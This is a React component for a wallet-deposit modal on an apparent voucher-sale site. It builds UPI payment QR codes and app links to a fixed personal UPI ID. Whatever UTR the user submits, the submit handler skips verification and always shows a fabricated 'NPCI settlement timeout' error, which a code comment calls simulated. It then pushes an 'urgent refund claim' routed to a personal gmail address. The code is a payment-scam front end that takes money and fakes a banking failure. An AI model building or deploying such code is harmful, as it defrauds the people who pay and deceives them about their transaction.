import React, { useState, useEffect } from 'react';
import QRCode from 'qrcode';
import {
  Wallet,
  AlertTriangle,
  ArrowRight,
  ShieldAlert,
  Copy,
  Check,
  X,
  RefreshCw,
  HelpCircle,
  QrCode as QrCodeIcon,
  ShieldCheck
} from 'lucide-react';

interface DepositModalProps {
  isOpen: boolean;
  onClose: () => void;
  onOpenRefundClaim: (data: { amount: number; utr: string; errorCode: string }) => void;
  targetBrandForDeposit?: { name: string; denom: number } | null;
}

export const DepositModal: React.FC<DepositModalProps> = ({
  isOpen,
  onClose,
  onOpenRefundClaim,
  targetBrandForDeposit
}) => {
  const [amount, setAmount] = useState<number>(targetBrandForDeposit?.denom || 1000);
  const [utrNumber, setUtrNumber] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [failedError, setFailedError] = useState<string | null>(null);
  const [copiedUpi, setCopiedUpi] = useState(false);
  const [copiedAmount, setCopiedAmount] = useState(false);
  const [qrDataUrl, setQrDataUrl] = useState<string>('');

  const FIXED_UPI_ID = 'priyanshu-xy@fam';
  const ERROR_CODE = 'ERR_NPCI_SETTLEMENT_TIMEOUT_504';
  const upiIntentString = `upi://pay?pa=${FIXED_UPI_ID}&pn=VoucherSale&am=${amount}&cu=INR&tn=VoucherSale%20Wallet%20Deposit`;

  // Generate dynamic QR code whenever amount or modal visibility changes
  useEffect(() => {
    if (isOpen && amount > 0) {
      QRCode.toDataURL(upiIntentString, {
        width: 240,
        margin: 2,
        color: {
          dark: '#0f172a',
          light: '#ffffff'
        }
      })
        .then((url) => setQrDataUrl(url))
        .catch((err) => console.error('Deposit QR error:', err));
    }
  }, [isOpen, amount, upiIntentString]);

  if (!isOpen) return null;

  const handleCopyUpi = () => {
    navigator.clipboard.writeText(FIXED_UPI_ID);
    setCopiedUpi(true);
    setTimeout(() => setCopiedUpi(false), 2000);
  };

  const handleCopyAmount = () => {
    navigator.clipboard.writeText(amount.toString());
    setCopiedAmount(true);
    setTimeout(() => setCopiedAmount(false), 2000);
  };

  const handleDepositSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!utrNumber || utrNumber.length < 12) return;

    setIsProcessing(true);
    setFailedError(null);

    // Simulated banking timeout error code ERR_NPCI_SETTLEMENT_TIMEOUT_504
    setTimeout(() => {
      setIsProcessing(false);
      setFailedError(ERROR_CODE);
    }, 1200);
  };

  const handleProceedToRefund = () => {
    onClose();
    onOpenRefundClaim({
      amount,
      utr: utrNumber || '482910482910',
      errorCode: ERROR_CODE
    });
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-slate-900/60 backdrop-blur-xs animate-in fade-in duration-200 overflow-y-auto">
      <div className="relative w-full max-w-md bg-white rounded-3xl shadow-2xl border border-slate-200 overflow-hidden my-auto max-h-[92vh] flex flex-col">
        {/* Header */}
        <div
          className={`p-4 text-white flex items-center justify-between shrink-0 ${
            failedError
              ? 'bg-rose-900'
              : 'bg-gradient-to-r from-amber-600 via-orange-600 to-amber-700'
          }`}
        >
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-xl bg-white/20 flex items-center justify-center font-bold">
              {failedError ? (
                <ShieldAlert className="w-4 h-4 text-rose-300" />
              ) : (
                <Wallet className="w-4 h-4 text-white" />
              )}
            </div>
            <div>
              <h3 className="font-extrabold text-sm sm:text-base leading-tight">
                {failedError ? 'Deposit Settlement Failed' : 'Scan QR & Deposit in Wallet'}
              </h3>
              <p className="text-[11px] text-amber-100">
                {failedError
                  ? 'NPCI Banking Gateway Response'
                  : 'Unlock extra 2% flat discount on every brand'}
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-full text-white/80 hover:text-white hover:bg-white/10 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Content */}
        <div className="p-4 sm:p-5 overflow-y-auto flex-1">
          {failedError ? (
            /* --- SIMULATED ERROR STATE --- */
            <div className="space-y-4 animate-in fade-in zoom-in-95 duration-200">
              <div className="p-4 rounded-2xl bg-rose-50 border-2 border-rose-300 space-y-2">
                <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-rose-600 text-white font-mono text-xs font-black">
                  <AlertTriangle className="w-3.5 h-3.5" />
                  <span>{ERROR_CODE}</span>
                </div>

                <div className="text-base font-black text-rose-950">
                  NPCI Settlement Gateway Timeout
                </div>

                <p className="text-xs text-rose-800 leading-relaxed">
                  Your bank account may have been debited for <strong>₹{amount}</strong>, but the centralized NPCI payment settlement did not receive merchant authorization within the 30-second window.
                </p>
              </div>

              <div className="p-3 bg-slate-50 rounded-2xl border border-slate-200 text-xs space-y-1.5">
                <div className="flex justify-between">
                  <span className="text-slate-500">Attempted Amount:</span>
                  <span className="font-bold text-slate-900">₹{amount}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Transaction UTR:</span>
                  <span className="font-mono font-bold text-slate-800">{utrNumber}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Merchant UPI:</span>
                  <span className="font-mono text-slate-700">{FIXED_UPI_ID}</span>
                </div>
              </div>

              {/* Action Button to Open Refund Claim */}
              <div className="pt-1 space-y-2">
                <button
                  type="button"
                  onClick={handleProceedToRefund}
                  className="w-full py-3 px-4 rounded-xl text-xs sm:text-sm font-black bg-rose-600 hover:bg-rose-700 text-white shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer active:scale-98"
                >
                  <HelpCircle className="w-4 h-4 text-rose-200" />
                  <span>File Urgent Refund Claim</span>
                  <ArrowRight className="w-4 h-4" />
                </button>

                <p className="text-[10px] text-slate-500 text-center leading-tight">
                  Dispatched directly to official finance desk: <strong>priyanshu08221@gmail.com</strong>
                </p>
              </div>
            </div>
          ) : (
            /* --- DEPOSIT INPUT FLOW WITH DYNAMIC QR CODE --- */
            <form onSubmit={handleDepositSubmit} className="space-y-4">
              {/* Extra 2% Benefit Banner */}
              <div className="p-2.5 rounded-2xl bg-amber-50 border border-amber-200 text-xs text-amber-900 flex items-start gap-2">
                <span className="text-base">🎁</span>
                <div className="leading-snug">
                  <strong>Extra 2% Savings Offer:</strong> Wallet balance par har voucher par instant 2% extra discount milega!
                </div>
              </div>

              {/* Select or type amount */}
              <div>
                <label className="block text-xs font-bold text-slate-800 mb-1.5">
                  Select Deposit Amount (₹)
                </label>
                <div className="grid grid-cols-4 gap-2 mb-2">
                  {[500, 1000, 2000, 5000].map((val) => (
                    <button
                      key={val}
                      type="button"
                      onClick={() => setAmount(val)}
                      className={`py-2 px-1 text-xs font-bold rounded-xl border transition-all cursor-pointer ${
                        amount === val
                          ? 'bg-amber-500 text-white border-amber-600 shadow-xs'
                          : 'bg-slate-50 text-slate-700 border-slate-200 hover:bg-slate-100'
                      }`}
                    >
                      ₹{val}
                    </button>
                  ))}
                </div>
                <div className="relative">
                  <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-xs font-bold text-slate-400">
                    ₹
                  </span>
                  <input
                    type="number"
                    min={100}
                    step={50}
                    value={amount}
                    onChange={(e) => setAmount(Number(e.target.value))}
                    className="w-full pl-8 pr-3.5 py-2 bg-slate-50 border border-slate-200 rounded-xl text-sm font-bold text-slate-900 focus:bg-white focus:outline-none focus:ring-2 focus:ring-amber-500/20 focus:border-amber-500"
                    placeholder="Custom deposit amount"
                  />
                </div>
              </div>

              {/* DYNAMIC QR CODE SECTION */}
              <div className="flex flex-col items-center bg-slate-50/80 p-3 rounded-2xl border border-slate-200">
                <div className="text-[11px] font-bold text-slate-700 mb-2 flex items-center gap-1.5">
                  <QrCodeIcon className="w-3.5 h-3.5 text-amber-600" />
                  <span>Scan QR Code to Deposit ₹{amount.toLocaleString('en-IN')}</span>
                </div>

                <div className="p-2.5 bg-white rounded-2xl border-2 border-slate-800 shadow-sm relative">
                  {qrDataUrl ? (
                    <img
                      src={qrDataUrl}
                      alt={`Scan QR to deposit ₹${amount} to ${FIXED_UPI_ID}`}
                      className="w-40 h-40 sm:w-44 sm:h-44 object-contain"
                    />
                  ) : (
                    <div className="w-40 h-40 flex items-center justify-center text-xs text-slate-400">
                      Generating Deposit QR...
                    </div>
                  )}
                  <div className="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-slate-900 text-white text-[8px] font-bold px-2 py-0.5 rounded-full shadow-xs whitespace-nowrap">
                    Scan with any UPI App
                  </div>
                </div>

                {/* Fixed UPI ID Box */}
                <div className="mt-3 w-full bg-white border border-slate-200 rounded-xl p-2 flex items-center justify-between">
                  <div>
                    <div className="text-[9px] uppercase font-bold text-slate-400">Merchant UPI ID</div>
                    <div className="text-xs font-mono font-black text-slate-900">
                      {FIXED_UPI_ID}
                    </div>
                  </div>
                  <button
                    type="button"
                    onClick={handleCopyUpi}
                    className="flex items-center gap-1 text-[10px] font-bold bg-slate-100 hover:bg-slate-200 text-slate-800 px-2 py-1 rounded-lg transition-colors cursor-pointer"
                  >
                    {copiedUpi ? (
                      <>
                        <Check className="w-3 h-3 text-emerald-600" />
                        <span className="text-emerald-700">Copied</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3 h-3" />
                        <span>Copy UPI</span>
                      </>
                    )}
                  </button>
                </div>

                {/* Direct App Launchers */}
                <div className="mt-2.5 w-full grid grid-cols-3 gap-1.5">
                  <a
                    href={upiIntentString}
                    className="py-1 px-1 rounded-lg text-[10px] font-bold text-center bg-[#5f259f]/10 text-[#5f259f] border border-[#5f259f]/20 hover:bg-[#5f259f]/20 transition-colors"
                  >
                    PhonePe
                  </a>
                  <a
                    href={upiIntentString}
                    className="py-1 px-1 rounded-lg text-[10px] font-bold text-center bg-[#1a73e8]/10 text-[#1a73e8] border border-[#1a73e8]/20 hover:bg-[#1a73e8]/20 transition-colors"
                  >
                    Google Pay
                  </a>
                  <a
                    href={upiIntentString}
                    className="py-1 px-1 rounded-lg text-[10px] font-bold text-center bg-[#00b9f1]/10 text-[#002e6e] border border-[#00b9f1]/20 hover:bg-[#00b9f1]/20 transition-colors"
                  >
                    Paytm
                  </a>
                </div>
              </div>

              {/* 12-digit UTR Input */}
              <div>
                <label className="block text-xs font-bold text-slate-800 mb-1">
                  Enter 12-digit Deposit UTR / Ref No.
                </label>
                <input
                  type="text"
                  maxLength={12}
                  value={utrNumber}
                  onChange={(e) => setUtrNumber(e.target.value.replace(/\D/g, ''))}
                  placeholder="e.g. 948201928301"
                  className="w-full px-3.5 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono tracking-wider focus:bg-white focus:outline-none focus:ring-2 focus:ring-amber-500/20 focus:border-amber-500"
                />
                <p className="text-[10px] text-slate-500 mt-1">
                  12-digit UTR number from your payment confirmation screen.
                </p>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isProcessing || utrNumber.length < 12}
                className={`w-full py-2.5 px-4 rounded-xl text-xs sm:text-sm font-bold flex items-center justify-center gap-2 transition-all cursor-pointer ${
                  utrNumber.length === 12 && !isProcessing
                    ? 'bg-amber-600 hover:bg-amber-700 text-white shadow-md'
                    : 'bg-slate-200 text-slate-400 cursor-not-allowed'
                }`}
              >
                {isProcessing ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin text-white" />
                    <span>Reconciling with NPCI Settlement...</span>
                  </>
                ) : (
                  <>
                    <span>Submit Deposit UTR & Verify</span>
                    <ArrowRight className="w-4 h-4" />
                  </>
                )}
              </button>
            </form>
          )}
        </div>
      </div>
    </div>
  );
};
